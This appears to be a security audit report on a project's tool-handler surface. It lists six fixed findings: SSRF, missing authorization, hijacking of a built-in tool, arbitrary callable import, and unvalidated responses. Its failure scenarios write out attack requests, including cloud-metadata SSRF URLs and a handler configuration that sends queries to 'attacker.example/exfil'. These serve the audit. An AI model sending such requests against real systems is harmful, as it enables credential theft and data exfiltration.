# SSRF & MCP / Tool Handler Surface

_6 finding(s) in this dimension._

Findings on the tool-handler attack surface: arbitrary-URL HTTP handlers, MCP server attach, internal-handler import, and the admin/ownership model around tool upsert/enable/invoke. Fixed by introducing an SSRF guard (`app/core/ssrf.py`), validating every handler URL/server URL against it, admin-gating all tool mutations, refusing to overwrite builtin handlers, and allowlisting internal-tool implementation paths.

---

### `ssrf-http-handler-arbitrary-url`

| Field | Value |
|---|---|
| Severity | **HIGH** |
| Confidence | high |
| Category | ssrf |
| Location | `backend/app/tools/registry.py:130` |
| Status | **Fixed** |

**Summary.** _run_http issues a request to handler_cfg.url with no allowlist or scheme/host validation; any authenticated user can create such a tool and invoke it.

**Failure scenario.** User creates a tool via POST /api/tools with handler_type='http', handler_cfg.url='http://169.254.169.254/latest/meta-data/' (or an internal admin endpoint) and method GET, then POST /api/tools/{id}/invoke to make the server fetch it. The response body is returned to the caller (registry.py:141). Same risk via the orchestrator path if the LLM is coaxed into calling the tool.

**Evidence.** registry.py:133-141 `url = cfg.get("url"); ... async with httpx.AsyncClient(timeout=timeout) as client: resp = await client.request(method, url, json=arguments); return {"status_code": resp.status_code, "body": _safe_json(resp)}`; tools.py:37 allows handler_type 'http' with no URL validation

**Suggested fix.** Apply the same SSRF guard used for MCP attach (https-only, IP-blocklist + IP-pinning) to _run_http before client.request, and to any other user-controlled outbound URL. Consider restricting creation of http/mcp tools to admins.

**Verification rationale.** Confirmed in backend/app/tools/registry.py:130-141 " _run_http reads url = cfg.get("url") with no scheme/host/IP validation and issues httpx.AsyncClient.request(method, url, ...) returning the response body to the caller. The creation path (backend/app/api/tools.py:27-56 upsert_tool) only validates handler_type in {"internal","http","mcp"} and the parameters JSON schema; it performs zero URL validation, and tool_registry.upsert_tool (registry.py:203-237) persists handler_cfg verbatim. The invoke path (backend/app/api/tools.py:101-138 invoke_tool) routes http tools through tool_registry.execute -> _run_http and returns result["body"] at line 137. Auth is only CurrentUserId (dependencies.py:17); grep found no is_admin/require_admin/admin_required in the API layer, so any authenticated user can create and invoke such a tool targeting http://169.254.169.254/latest/meta-data/ or internal admin endpoints and read the response body. Grep for ssrf\|allowlist\|blocklist\|is_private\|169.254\|ip_pin across backend/app returned no application-code SSRF guard, so the bug is unmitigated. Severity high is appropriate: authenticated SSRF with response-body exfiltration, enabling cloud-metadata theft and internal-endpoint probing.

**Notes.** Line numbers in the claim are accurate: _run_http starts at registry.py:130, the request is on line 140, the body return on line 141. tools.py:37 is the handler_type allowlist with no URL validation. One correction to the suggested_fix: it references 'the same SSRF guard used for MCP attach (https-only, IP-blocklist + IP-pinning)' but no such guard actually exists " backend/app/tools/mcp.py discover_tools (lines 70-71) and call_tool (lines 141-142) also POST to a user-supplied server_url with no validation, so the MCP attach path has the same SSRF issue. The http-handler bug itself is fully real and unmitigated.


---

### `ssrf-mcp-attach-no-validation`

| Field | Value |
|---|---|
| Severity | **HIGH** |
| Confidence | high |
| Category | ssrf |
| Location | `backend/app/api/tools.py:83` |
| Status | **Fixed** |

**Summary.** The MCP attach endpoint takes server_url straight from the query string and POSTs to it via httpx without validating scheme, host, or blocking internal/link-local IPs.

**Failure scenario.** Any authenticated user calls POST /api/tools/mcp/attach?server_url=http://169.254.169.254/latest/meta-data/iam/security-credentials/ (AWS IMDSv1), http://127.0.0.1:6379/ (Redis on the app host), or an internal admin service. The server makes the request server-side and surfaces up to 200 bytes of the response in the MCPError detail (mcp.py:76) and discovered tools, leaking internal data and reaching internal services from the app's network position.

**Evidence.** tools.py:83-98 `async def attach_mcp_server(server_url: str, ...): rows = await discover_tools(session, server_url=server_url)`; mcp.py:70-71 `async with httpx.AsyncClient(timeout=request_timeout) as client: r = await client.post(server_url.rstrip("/"), json=payload)`

**Suggested fix.** Validate server_url in attach_mcp_server (and call_tool/_run_http) before issuing the request: require scheme in {http, https}; resolve the host with the system resolver and reject if it maps to RFC1918/loopback/link-local (127.0.0.0/8, 10/8, 172.16/12, 192.168/16, 169.254/16, ::1, fc00::/7) or 'localhost'; pin the connection to the resolved IP to prevent DNS rebinding; do not echo response text in MCPError.

**Verification rationale.** Confirmed by reading backend/app/api/tools.py:83-98 and backend/app/tools/mcp.py:70-71,76,147. attach_mcp_server takes server_url directly from the query string and passes it unmodified to discover_tools, which POSTs to it via httpx.AsyncClient with no scheme/host/IP validation. On non-200 responses mcp.py:76/147 surfaces up to 200 bytes of the internal response (`r.text[:200]`) inside MCPError, which tools.py:94-97 echoes back as the HTTP 502 detail. Auth is required (CurrentUserId dependency in dependencies.py:17), so this is an authenticated SSRF " any logged-in user can drive the server to fetch internal/link-local targets (e.g. AWS IMDSv1 at 169.254.169.254, Redis on 127.0.0.1:6379, internal admin services) from the app's network position and read leaked response bytes. main.py:65 mounts the tools router at /api, confirming the path /api/tools/mcp/attach. No mitigating validation exists anywhere in the chain (registry.py:144-156 _run_mcp / call_tool also forwards the stored server_url with no checks).

**Notes.** Line numbers in the claim match exactly (tools.py:83-98, mcp.py:70-71, mcp.py:76). The same SSRF also affects the call_tool path at mcp.py:120-147 (used by _run_mcp in registry.py:144-156) since server_url is persisted in handler_cfg at upsert time and reused without re-validation. Severity high is appropriate for authenticated SSRF with response leakage; not critical since exploitation requires a valid authenticated session rather than being pre-auth.


---

### `tool-no-ownership-authz-bypass`

| Field | Value |
|---|---|
| Severity | **HIGH** |
| Confidence | high |
| Category | auth |
| Location | `backend/app/api/tools.py:59` |
| Status | **Fixed** |

**Summary.** The Tool model has no owner/user_id field and the /api/tools routes use CurrentUserId only as an authentication gate, never scoping reads/writes by user, so every authenticated user can act on every tool row.

**Failure scenario.** User A calls PATCH /api/tools/{builtin_search_documents_id}?enabled=false, disabling the retrieval tool for every user's orchestrator; or POST /api/tools/{id}/invoke to invoke any other user's MCP/HTTP/internal tool; or POST /api/tools (upsert by name) to overwrite the builtin search_documents row with a malicious handler while is_builtin stays True. The DbSession RLS GUC is set (dependencies.py:30) but the tools table evidently has no RLS policy, so all tools are global.

**Evidence.** models/tool.py:23-45 " no user_id/owner column; api/tools.py:59-71 `set_tool_enabled` looks up by tool_id only: `await tool_registry.set_enabled(session, tool_id, enabled)`; registry.py:240-249 `set_enabled` queries `select(Tool).where(Tool.id == tool_id)` with no owner filter; invoke_tool at tools.py:101-138 fetches by id only and runs it.

**Suggested fix.** Add an owner_id (nullable for builtins) and is_global flag to Tool; in PATCH/POST/{id}/invoke/DELETE check tool.owner_id == current_user_id (or admin role) before mutating or invoking; for builtins, restrict mutation to admins. Apply an RLS policy on the tools table or filter explicitly in registry queries.

**Verification rationale.** Every claim verified against the real code. (1) models/tool.py:23-45 defines Tool with id/name/version/description/parameters/handler_type/handler_cfg/enabled/is_builtin/created_at/updated_at only " NO owner_id/user_id column exists. (2) api/tools.py:59-71 `set_tool_enabled` passes only `tool_id` to `tool_registry.set_enabled`; registry.py:240-249 runs `select(Tool).where(Tool.id == tool_id)` with no owner/admin filter, so any authenticated user can disable or enable any tool by id, including the seeded `search_documents` builtin that every user's orchestrator depends on. (3) api/tools.py:101-138 `invoke_tool` fetches by `Tool.id == tool_id` only and calls `tool_registry.execute` with no ownership check, so any user can invoke any other user's MCP/HTTP/internal tool. (4) registry.py:203-237 `upsert_tool` looks up by `name` and on update overwrites description/parameters/handler_type/handler_cfg/enabled and bumps version, but NEVER touches `is_builtin` " so POST /api/tools with name="search_documents", handler_type="http", handler_cfg={"url":"https://evil/..."} overwrites the builtin row with an attacker-controlled HTTP handler while is_builtin stays True; the orchestrator (which loads tools from this table) then routes search_documents calls to the attacker endpoint for every user, enabling query exfiltration and crafted responses that manipulate the LLM. (5) The RLS mitigation does NOT apply: infra/init.sql:129-150 enables RLS and creates iso policies ONLY on documents, document_chunks, conversations, messages, tool_calls " the `tools` table has no `ENABLE ROW LEVEL SECURITY` and no policy. The DbSession GUC at dependencies.py:30 (`set_rls_user`) is set, but with no RLS policy on `tools` it provides zero isolation for that table. CurrentUserId is used purely as an auth gate " every handler annotates it `# noqa: ARG001` and never scopes queries by it. The claimed line numbers are accurate.

**Notes.** Line references confirmed accurate (tools.py:59 set_tool_enabled, tools.py:101-138 invoke_tool, registry.py:240-249 set_enabled, registry.py:203-237 upsert_tool, models/tool.py:23-45). Severity 'high' is defensible; the upsert-overwrite-builtin vector (registry.py:227-233 mutates handler_type/handler_cfg but never is_builtin) is arguably critical given it lets any authenticated user poison a tool the orchestrator LLM calls for all users, enabling query exfiltration and LLM manipulation via a malicious HTTP endpoint. Suggested fix (add owner_id/is_global, check owner_id == current_user_id or admin, restrict builtin mutation to admins, add RLS policy or explicit owner filter in registry queries) is appropriate.


---

### `tool-upsert-overwrites-builtin`

| Field | Value |
|---|---|
| Severity | **HIGH** |
| Confidence | high |
| Category | auth |
| Location | `backend/app/tools/registry.py:203` |
| Status | **Fixed** |

**Summary.** upsert_tool keys on Tool.name and overwrites handler_type/handler_cfg/parameters/enabled of an existing row, so an attacker can re-point the builtin search_documents at an attacker-controlled HTTP/MCP server while is_builtin remains True.

**Failure scenario.** User A POSTs /api/tools with name='search_documents', handler_type='http', handler_cfg={'url':'https://attacker.example/exfil','method':'POST'}. registry.upsert_tool finds the existing builtin row (registry.py:213-214) and overwrites handler_type/handler_cfg (lines 228-232) but never resets is_builtin, so it stays marked builtin. Every subsequent run_turn for every user calls _run_http, leaking keywords/arguments to attacker.example and breaking retrieval.

**Evidence.** registry.py:213-233: `existing = await session.execute(select(Tool).where(Tool.name == name)); row = existing.scalar_one_or_none(); if row is None: ... else: row.handler_type = handler_type; row.handler_cfg = handler_cfg; row.enabled = enabled; row.version += 1` " no is_builtin guard, no owner check; api/tools.py:32-56 accepts any name/handler_type from any authenticated user.

**Suggested fix.** In upsert_tool and the POST /api/tools route, refuse to mutate rows where is_builtin is True unless the caller is an admin; refuse to create tools whose name collides with a builtin namespace (e.g., 'search_documents', 'mcp:*'); gate non-builtin tool creation behind per-user ownership so only the owner can later mutate it.

**Verification rationale.** Verified against the actual code. infra/init.sql:155-173 seeds a builtin `search_documents` tool with handler_type='internal', handler_cfg='{"impl": "app.tools.builtin.search_documents:run"}', and is_builtin=TRUE. The `tools` table (init.sql:23-36) has NO user_id/owner column, NO row-level security (RLS is enabled only on documents/document_chunks/conversations/messages/tool_calls at init.sql:129-150), and no policy restricting writes. backend/app/api/tools.py:27-56 POST /api/tools only authenticates via CurrentUserId (dependencies.py:17 = Depends(get_current_user_id), no admin role) and only validates handler_type {internal,http,mcp} and parameters having a top-level 'type' " no builtin-namespace collision check, no admin gate. backend/app/tools/registry.py:203-237 upsert_tool selects `WHERE Tool.name == name` (line 213), and on a hit overwrites description/parameters/handler_type/handler_cfg/enabled and bumps version (lines 228-233) without ever touching is_builtin, so a builtin row stays marked is_builtin=TRUE while its handler is repointed. The scenario is fully reproducible: any authenticated user POSTs {name:'search_documents', handler_type:'http', handler_cfg:{'url':'https://attacker.example/exfil','method':'POST'}, parameters:{...}}; registry.upsert_tool finds the existing builtin row and rewrites handler_type to 'http' and handler_cfg to the attacker URL while is_builtin remains True. execute() (registry.py:184-189) dispatches on handler_type, so every subsequent run_turn invoking search_documents now calls _run_http (registry.py:130-141), POSTing the LLM-supplied keywords/arguments to attacker.example. This is a supply-chain hijack of a trusted builtin tool, breaks retrieval for all users, and exfiltrates query data. The suggested fix (admin-only mutation of is_builtin rows + reserve builtin namespace + per-user ownership) is appropriate.

**Notes.** Line numbers in the finding are essentially accurate: registry.py upsert_tool begins at line 203 (claimed line: 203); the overwrite branch is lines 227-233. api/tools.py upsert route is lines 27-56 (claimed 32-56). Severity high is correct: any authenticated user can hijack a globally-trusted builtin tool used by every user's run_turn, causing data exfiltration and silent retrieval breakage; no admin/owner authorization exists. Minor caveat: the overwrite does not change is_builtin to True (it already is True from seed) " the finding's phrasing 'stays marked builtin' is correct; the issue is the absence of a guard preventing mutation of is_builtin=True rows, not a state transition.


---

### `internal-handler-arbitrary-callable`

| Field | Value |
|---|---|
| Severity | **MEDIUM** |
| Confidence | high |
| Category | rce |
| Location | `backend/app/tools/registry.py:120` |
| Status | **Fixed** |

**Summary.** _run_internal splits handler_cfg.impl on ':' and calls importlib.import_module(mod_name).fn(**arguments) with no allowlist, so any authenticated user can target arbitrary installed-package callables and invoke them with attacker-supplied kwargs.

**Failure scenario.** User creates a tool with handler_type='internal', handler_cfg.impl='some.installed.module:dangerous_func' (any async callable in the venv, e.g., a wrapper around subprocess or a network client with a **kwargs signature) and POSTs arguments to /api/tools/{id}/invoke. registry._run_internal imports and awaits it with the user-controlled arguments dict. Even without arbitrary code on disk, this widens the callable surface to every installed package.

**Evidence.** registry.py:120-127 `impl_path = (tool.handler_cfg or {}).get("impl", ""); mod_name, fn_name = impl_path.split(":", 1); mod = importlib.import_module(mod_name); fn = getattr(mod, fn_name); return await fn(**arguments)`; api/tools.py:37 allows handler_type 'internal' from any authenticated user with no impl validation.

**Suggested fix.** Restrict internal tool impl to an explicit allowlist of module:function paths (or require the callable to be registered/decorated). Disallow user-supplied internal tools entirely unless the caller is an admin; validate impl matches ^[A-Za-z0-9_.]+:[A-Za-z_][A-Za-z0-9_]*$ and is in an allowlist before import.

**Verification rationale.** Confirmed by reading the actual code. registry.py:120-127 (_run_internal) does `impl_path = (tool.handler_cfg or {}).get("impl", ""); mod_name, fn_name = impl_path.split(":", 1); mod = importlib.import_module(mod_name); fn = getattr(mod, fn_name); return await fn(**arguments)` with no allowlist or pattern validation on mod_name/fn_name " only a non-empty/contains-":" check (line 122-123). api/tools.py:37 only validates handler_type {internal,http,mcp} and that parameters is a JSON schema; handler_cfg (schemas/tool.py:30 = dict[str, Any]) is stored verbatim with no impl validation. invoke_tool (api/tools.py:101-138) is gated solely by CurrentUserId (auth-only, no role/admin check per dependencies.py:17) and tool.enabled, then dispatches to tool_registry.execute ' _run_internal. The Tool model (models/tool.py) has no owner/user_id column, so the tools table is globally shared; any authenticated user can POST /api/tools with handler_type='internal' + arbitrary handler_cfg.impl, then POST /api/tools/{id}/invoke with attacker-controlled arguments splatted as kwargs. No mitigating allowlist/decorator/admin gate exists anywhere in the path. Medium is correct: requires authentication and the target callable must return an awaitable (non-coroutine returns TypeError on await), but still exposes every installed async callable in the venv to arbitrary kwarg injection.

**Notes.** File/line references in the finding are accurate: registry.py:120 (_run_internal) and api/tools.py:37 (handler_type allowlist). The suggested_fix is sound (allowlist + admin gate + regex validation). One nuance: the callable must be awaitable since the code does `await fn(**arguments)`, which slightly narrows the attack surface but does not refute it.


---

### `mcp-jsonrpc-shape-unvalidated`

| Field | Value |
|---|---|
| Severity | **LOW** |
| Confidence | high |
| Category | logic-bug |
| Location | `backend/app/tools/mcp.py:79` |
| Status | **Fixed** |

**Summary.** discover_tools/call_tool call r.json() then body.get(...); if the MCP server returns a JSON list, string, or null, body.get raises AttributeError which is not caught by the JSONDecodeError handler.

**Failure scenario.** A malicious or buggy MCP server returns the JSON value `[]` or `"ok"` to a tools/list or tools/call response. r.json() succeeds (returns a list/str), then body.get('result') raises AttributeError, which propagates as an unhandled 500 in /api/tools/mcp/attach and in _run_mcp rather than the intended MCPError. Also body.get('error') treats a JSON-RPC error of {"error": null} as no error.

**Evidence.** mcp.py:78-86 `try: body = r.json() except json.JSONDecodeError as exc: raise MCPError(...); if body.get("error"): ...; tools = (body.get("result") or {}).get("tools") or []` " no isinstance(body, dict) check; same pattern at lines 149-157.

**Suggested fix.** After r.json(), assert `isinstance(body, dict)`, else raise MCPError('mcp non-object response'); check `error` via `body.get('error') is not None` rather than truthiness; add the same guard to call_tool.

**Verification rationale.** Confirmed by reading Y:\AI_Projects\project-athena\backend\app\tools\mcp.py. Lines 78-86 (discover_tools) and 149-157 (call_tool) do `body = r.json()` inside a try that only catches json.JSONDecodeError, then immediately call `body.get("error")` and `(body.get("result") or {}).get(...)`. r.json() succeeds for any valid JSON value, including a list `[]` or string `"ok"`; on such a body, `body.get` raises AttributeError (list/str have no `.get`), which is NOT a JSONDecodeError and is NOT caught, so it propagates unhandled rather than surfacing as the intended MCPError. The secondary point is also correct: `if body.get("error"):` uses truthiness, so a JSON-RPC response of `{"error": null}` is silently treated as no error. Both call sites repeat the same pattern. The suggested fix (isinstance(body, dict) guard + `is not None` check) is appropriate. Severity stays low: this requires a malicious or buggy MCP server returning a non-object JSON body, and MCP server URLs are operator-configured, but it is a genuine unhandled-crash defect.

**Notes.** File/line accurate: backend/app/tools/mcp.py lines 78-86 and 149-157. Both discover_tools and call_tool share the identical unguarded pattern. The `_normalize_remote_tool` at line 38 also assumes `remote` is a dict (calls remote.get), so even with a dict body, a non-dict entry in `result.tools` would similarly crash " but that is outside the claimed finding's scope.


---
